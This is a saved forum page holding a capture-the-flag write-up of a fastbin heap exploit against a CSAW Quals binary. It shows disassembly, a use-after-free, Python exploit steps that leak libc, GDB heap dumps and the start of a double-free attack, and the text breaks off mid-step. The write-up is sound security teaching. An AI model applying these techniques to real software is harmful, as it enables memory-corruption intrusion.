<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Heap Exploitation - Fastbin Attack - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Sup folks! I hope you‚Äôre doing great! CSAW Quals took place the past weekend and @exploit and myself teamed up for some binary exploitation session. He‚Äôs actually so good that he pwned a 500 point binary! 
Interestingly &amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="3627.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="E0EM88E5GHs0XSwz1qZRXmRmK"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="E0EM88E5GHs0XSwz1qZRXmRmK"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Heap Exploitation - Fastbin Attack&#39;" href="3627.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/heap-exploitation-fastbin-attack/3627" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/heap-exploitation-fastbin-attack/3627" />
<meta property="og:title" content="Heap Exploitation - Fastbin Attack" />
<meta name="twitter:title" content="Heap Exploitation - Fastbin Attack" />
<meta property="og:description" content="Sup folks! I hope you‚Äôre doing great! CSAW Quals took place the past weekend and @exploit and myself teamed up for some binary exploitation session. He‚Äôs actually so good that he pwned a 500 point binary!  Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I planned on covering after my UAF write-up, so I decided to tackle it and here I am, about to explain to you the whys and hows of my exploit. This time I‚Äôll go full ascii-art on you.  By the way, if th..." />
<meta name="twitter:description" content="Sup folks! I hope you‚Äôre doing great! CSAW Quals took place the past weekend and @exploit and myself teamed up for some binary exploitation session. He‚Äôs actually so good that he pwned a 500 point binary!  Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I planned on covering after my UAF write-up, so I decided to tackle it and here I am, about to explain to you the whys and hows of my exploit. This time I‚Äôll go full ascii-art on you.  By the way, if th..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="heap" />
<meta property="og:article:tag" content="binary" />
<meta property="og:article:tag" content="linux" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="6 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="36 ‚ù§" />
<meta property="article:published_time" content="2017-09-18T12:28:20+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="3627.html">Heap Exploitation - Fastbin Attack</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/exploitation.html' class='discourse-tag' rel="tag">exploitation</a>, 
            <a href='../../tag/heap.html' class='discourse-tag' rel="tag">heap</a>, 
            <a href='../../tag/binary.html' class='discourse-tag' rel="tag">binary</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Heap Exploitation - Fastbin Attack'>
      <link itemprop='url' href='3627.html'>
      <meta itemprop='datePublished' content='2017-09-18T12:28:20Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='exploitation, heap, binary, linux'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="3627.html">


              <span class="crawler-post-infos">
                  <time  datetime='2017-09-18T12:28:20Z' class='post-time'>
                    September 18, 2017, 12:28pm
                  </time>
                  <meta itemprop='dateModified' content='2018-01-25T10:04:32Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Sup folks! I hope you‚Äôre doing great! CSAW Quals took place the past weekend and <a class="mention" href="../../u/exploit.html">@exploit</a> and myself teamed up for some binary exploitation session. He‚Äôs actually so good that he pwned a <strong>500</strong> point binary!</p>
<p>Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I planned on covering after my <a href="../../../external.html?link=https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580">UAF</a> write-up, so I decided to tackle it and here I am, about to explain to you the whys and hows of my exploit. This time I‚Äôll go full ascii-art on you.</p>
<p>By the way, if this is your first time ever hearing about heap exploitation, it‚Äôd be wise to check out the UAF write-up I linked above along with the resource links that can be found in it.</p>
<p>Without further ado, let‚Äôs get right into!</p>
<hr>
<h3><em>Binary Review</em></h3>
<pre><code class="lang-makefile">RELRO           STACK CANARY      NX            PIE          
Partial RELRO   No canary found   NX enabled    No PIE 
</code></pre>
<pre><code class="lang-makefile">
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME

</code></pre>
<p>We can allocate chunks, free them, edit them and dump their content. There isn‚Äôt much else to say so let‚Äôs dive in the assembly for some bug hunting.</p>
<hr>
<h3><em>Reverse Engineering</em></h3>
<p>The binary was in C++ (the disassembly of C++ isn‚Äôt the same as C and sometimes can be scary too) for the most part but the bug itself wasn‚Äôt related to that fact. Instead of messing around with C++'s assembly line-by-line, I spotted the functions that allocate / free chunks and checked for heap-related bugs.</p>
<pre><code class="lang-auto">              [...]
00401621  mov     rsi, qword [rbp-0x80]
00401625  movsxd  rdi, dword [rsi]
00401628  mov     rdi, qword [rdi*8+0x605310]
00401630  mov     qword [rbp-0xa0], rax
00401637  call    free
              [...]
</code></pre>
<p>This is the meat of the binary. We‚Äôve got a global array of malloc‚Äôd pointers at <code>0x605310</code> and <code>free</code> being called on them. However, those pointers aren‚Äôt being zeroed out by the program, meaning we abuse UAF to leak libc pointers and we can extend this UAF and turn into a double-free bug in order to perform a fastbin attack (will explain it in detail later on, no worries).</p>
<p>Although the binary is overall messy, we can get a pretty accurate idea of what‚Äôs up with its functionality just with the above lines of assembly. Let‚Äôs develop a visual image of how the binary actually handles the heap while stepping through my exploit.</p>
<hr>
<p>###<em>Exploit Visualization</em></p>
<pre><code class="lang-python">alloc(0x80, 'A'*10) # chunk 1
alloc(0x80, 'B'*10) # chunk 2
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 1
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Looks good so far. So once an allocation takes place, we get to choose the size of the chunk and then we enter a description for it (no overflow).</p>
<p>With just those 2 allocated chunks we can get a libc leak thanks to the UAF bug. We‚Äôll free <code>chunk 0</code> in order to make that happen. Why not free <code>chunk 1</code> you ask? Let‚Äôs have a look at <code>free</code>'s source code and find out ourselves.</p>
<pre><code class="lang-auto">static void
_int_free (mstate av, mchunkptr p, int have_lock)
              
                [...]

/*
   If the chunk borders the current high end of memory,
   consolidate into top
*/

else {
   size += nextsize;
   set_head(p, size | PREV_INUSE);
   av-&gt;top = p;
   check_chunk(av, p);
}

                [...]
</code></pre>
<p>Fortunately <code>free</code>'s source code is well documented so just by reading the above code and with a quick assumption test in GDB we can translate this to something intuitive.</p>
<pre><code class="lang-makefile">gef‚û§  x/40gx 0x0000000000617c20 - 16
0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000020361 &lt;-- new top chunk
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
</code></pre>
<p>As you can see we free‚Äôd chunk 1 and since its next chunk was the top chunk / wilderness, they got consolidated into a bigger top chunk to be used for further allocation requests. Note that there are no forward  / backward in that area. Top chunk‚Äôs address is taken from the <code>main_arena</code> structure in libc‚Äôs address space and thus there‚Äôs no reason to keep track of it via linked lists etc.</p>
<p>Now that we‚Äôve excluded the de-allocation of the chunk whose bordering chunk is the wilderness, let‚Äôs move on with our plan.</p>
<pre><code class="lang-python">free(0)
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0 [free]
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090 &lt;-- chunk 1 [in use]
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
</code></pre>
<p>Note how chunk 1‚Äôs size went from <strong>0x91</strong> to <strong>0x90</strong> to indicate that its previous chunk is <strong>free</strong>. Be careful though, when it comes to chunks of fastbin size, their lsb (least significant bit) remains set for speed purposes.</p>
<p>As you can see chunk 0‚Äôs area got populated with 2 pointers of same nature and value. They are pointer to libc‚Äôs main arena structure. Libc keeps track of the free‚Äôd chunks by storing their pointers in an array of pointers whose each entry is a linked list of a certain size. The chunks I allocated were purposely of size <code>0x90</code>, which indicates that they are of smallbin size (fastbins‚Äô max size is <code>0x80</code>), which means they will be placed in a circular double-linked list. Have a look at this awesome <a href="../../../external.html?link=https://imgur.com/a/UDkUV" rel="nofollow noopener">image</a> by this <a href="../../../external.html?link=https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" rel="nofollow noopener">article</a> to get a feel of what‚Äôs going on, it‚Äôs not that complicated.</p>
<p>Moving on, we now have a libc leak which officially marks the success of our first objective, getting the base address of libc.</p>
<pre><code class="lang-python">
leak = dump(0)
libc = leak - 0x3c4b78
</code></pre>
<p>We‚Äôre one step closer to total pwning. It‚Äôs time to take advantage of the double-free form of UAF and bring the flag home.</p>
<hr>
<p>###<em>Fastbin Attack</em></p>
<p>Before I begin explaining the hows and whys of the fastbin attack, I‚Äôd like to give a huge shoutout to shellphish who created the <a href="../../../external.html?link=https://github.com/shellphish/how2heap" rel="nofollow noopener">how2heap</a> repo which basically documents modern heap exploitation techniques. I highly recommend going through the code examples and figuring out the heap internals by tweaking and debugging.</p>
<p>Let‚Äôs get started. First we‚Äôll bring heap to its original state so we can have a fresh start. Though it‚Äôs not necessary, I like keeping things clean and simple. Those who were paying close attention can figure out how to do that.</p>
<pre><code class="lang-python">free(1)
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x00000000000203f1 &lt;-- new top chunk
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- old top chunk
</code></pre>
<p>The heap has been ‚Äúre-initialized‚Äù by consolidating the last remaining chunk with the wilderness / top chunk and it‚Äôs ready for new use, or abuse <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Someone could assume that the fastbin attack is related to fastbins. That‚Äôs indeed the case. We‚Äôre about to exploit the way <code>malloc</code> serves / checks free‚Äôd fast chunks to the user. Let‚Äôs create 2 chunks of fastbin size and one of smallbin size to be used as a border in order to prevent consolidation (don‚Äôt pay attention on that one).</p>
<pre><code class="lang-python">alloc(0x60, 'C'*10) # chunk 2
alloc(0x60, 'D'*10) # chunk 3
alloc(0x80, 'E'*10) # chunk 4
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3
0x617c90:	0x4444444444444444	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Free-ing chunk 2 and chunk 3 (the order doesn‚Äôt really matter as you‚Äôll notice later on) will create the following structure in libc:</p>
<hr>
<pre><code class="lang-makefile">fastbinsY[] initial state

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
     
</code></pre>
<hr>
<pre><code class="lang-python">free(3)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [in use]
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<hr>
<pre><code class="lang-python">free(2)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
